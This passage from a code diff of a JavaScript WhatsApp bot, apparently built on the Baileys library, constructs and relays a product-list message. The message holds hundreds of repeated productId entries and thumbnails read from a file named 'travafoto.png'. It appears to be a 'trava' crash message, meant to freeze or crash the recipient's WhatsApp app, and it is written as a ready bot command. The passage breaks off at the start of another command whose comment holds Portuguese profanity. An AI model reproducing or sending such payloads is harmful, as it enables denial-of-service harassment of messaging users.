+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+                "productId": "4120139628109348"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "6431678466857362"
+              },
+              {
+              	"productId": "4392524570816732"
+              },
+              {
+              	"productId": "6431678466857362"
+              }
+            ]
+          }
+        ],
+        "headerImage": {
+          "productId": "4120139628109348",
+          "Thumbnail": fs.readFileSync(`./fotos/travafoto.png`),
+          "jpegThumbnail": fs.readFileSync(`./src/carrinho.jpeg`),
+        },
+        "businessOwnerJid": sender
+      },
+      "footerText": "..."
+    }
+  }, {quoted: mek})
+  trick.relayWAMessage(anu, {waitForAck: true})
+break
+
+case 'doc': //by bruxo apaga nada n fi da puta
+      doc = (teks) => {
+      	res = 
